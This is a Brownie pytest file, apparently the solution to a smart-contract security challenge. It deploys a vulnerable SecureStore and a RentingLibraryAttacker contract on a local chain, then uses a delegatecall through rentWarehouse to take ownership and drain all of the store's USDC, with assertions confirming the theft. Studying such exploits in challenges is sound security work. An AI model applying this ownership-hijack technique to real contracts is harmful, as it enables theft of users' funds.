from web3 import Web3
from brownie import accounts, RentingLibrary, SecureStore, RentingLibraryAttacker, Wei, DummyERC20, chain
import pytest

@pytest.fixture
def deploy():
    yellow ='\x1b[0;33m'
    green ='\x1b[0;32m'
    red='\x1b[0;31m'
    nocolor='\x1b[0;m'

    INITIAL_SUPPLY = Wei('100 ether')
    DAILY_RENT_PRICE = Wei('50 ether')
    ATTACKER_INITIAL_BALANCE = Wei('100 ether')
    STORE_INITIAL_BALANCE = Wei('100000 ether')

    [deployer, attacker] = accounts[:2]

    # Adding 100 accounts
    print(red,"\r[ * ] \x1b[0;43m0xm4ud CALL Attacker 3000\x1b[0;m")
    print(red,"\r[ * ]\x1b[0;m RICKY BOBBY says: I WANNA CALL FAST!!!",nocolor)

    # Web3 instance
    w3 = Web3(Web3.HTTPProvider())

    #Deploy RainbowAllianceToken
    print(green,"\r[ + ]\x1b[0;m Deploying RentingLibrary, USDC and SecureStore",nocolor)
    rentingLibrary= RentingLibrary.deploy({'from': deployer, 'gas_price': 0x4133110a0})

    usdc = DummyERC20.deploy("USDC Token", "USDC", INITIAL_SUPPLY,{'from': deployer})

    secureStore = SecureStore.deploy(rentingLibrary.address, DAILY_RENT_PRICE, usdc.address, {'from': deployer, 'gas_price': 0x4133110a0})
  
    usdc.mint(attacker.address, ATTACKER_INITIAL_BALANCE, {'from': deployer})

    usdc.mint(secureStore.address, STORE_INITIAL_BALANCE, {'from': deployer})

    return rentingLibrary, secureStore, usdc, deployer, attacker, w3, ATTACKER_INITIAL_BALANCE, STORE_INITIAL_BALANCE


def test_exploit(deploy):

    rentingLibrary, secureStore, usdc, deployer, attacker, w3, \
    ATTACKER_INITIAL_BALANCE, STORE_INITIAL_BALANCE = deploy

    # Deploying the attacker contract
    attackerContract = RentingLibraryAttacker.deploy({'from': attacker})
    # Approving the attacker contract to spend 50 USDC
    usdc.approve(secureStore.address, '100 ether', {'from': attacker})

    # converting the address to int
    attacker_addr = int(attackerContract.address, 16)

    secureStore.rentWarehouse(1, attacker_addr, {'from': attacker})
    # sleepingt to wait for the rent to be paid
    chain.sleep(1684015351)
    chain.mine()

    # Delegatecall to the attacker contract, which will change secureStore owner and call the withdrawAll function
    secureStore.rentWarehouse(1, attacker_addr, {'from': attacker})

    # Attacker is new owner of the warehouse and can withdraw all funds
    secureStore.withdrawAll({'from': attacker.address})
    # Assertions to check that the exploit was successful
    assert(usdc.balanceOf(secureStore.address) == 0)
    assert(usdc.balanceOf(attacker.address) == ATTACKER_INITIAL_BALANCE + STORE_INITIAL_BALANCE)